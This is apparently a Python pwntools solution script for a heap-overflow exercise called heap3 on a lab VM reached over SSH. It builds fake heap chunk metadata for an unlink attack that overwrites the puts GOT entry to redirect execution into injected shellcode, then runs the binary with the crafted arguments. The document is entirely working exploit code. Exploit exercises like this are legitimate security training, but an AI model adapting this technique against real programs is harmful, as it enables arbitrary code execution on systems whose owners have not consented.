
from heaplib import HeapPayloadCrafter
from pwn import *
context.arch = "i386"

shell = ssh(user="user", host="192.168.5.199", password="user", port=22)

GOT_PUTS = 0x0804b128
SC = 0x804c008 + 8

hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32, pre_presets={31, "b"}, post_presets={0:"a"})
#hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32)
prev, metadata, post = hpc.generate_payload()

PREV_SIZE_C, SIZE_C = metadata

arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"

#PREV_SIZE_C = pack(0xfffffff8)
#SIZE_C = pack(0xfffffff0)
#arg2 = "A" * 16 + pack(0xfffffff0) + pack(0xfffffff8) + "A"*8 + PREV_SIZE_C + SIZE_C

#CR_PREV_SIZE = pack(0xfffffff0)
#CR_SIZE = pack(0xfffffff1)
#FD = pack(GOT_PUTS-12)
#BK = pack(SC)
#arg3 = CR_PREV_SIZE + CR_SIZE + FD + BK + "A"*100

arg2 = ''.join(prev) + ''.join([pack(i) for i in metadata])
print len(arg2)
arg3 = ''.join(post)

print
print
print "-=================================]"
print "prev length = %d" % len(prev)
print "post length = %d" % len(post)
print "PREV_SIZE_C   : %s   %d" % (hex(PREV_SIZE_C & 0xffffffff), PREV_SIZE_C)
print "SIZE_C        : %s   %d" % (hex(SIZE_C & 0xffffffff), SIZE_C)
print "-=================================]"
print "prev          : %s" % repr(prev)
print
print "post          : %s" % repr(post)
print

open("dump", "w").write(arg1 + " " + arg2 + " " + arg3)

p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
print p.recvline()



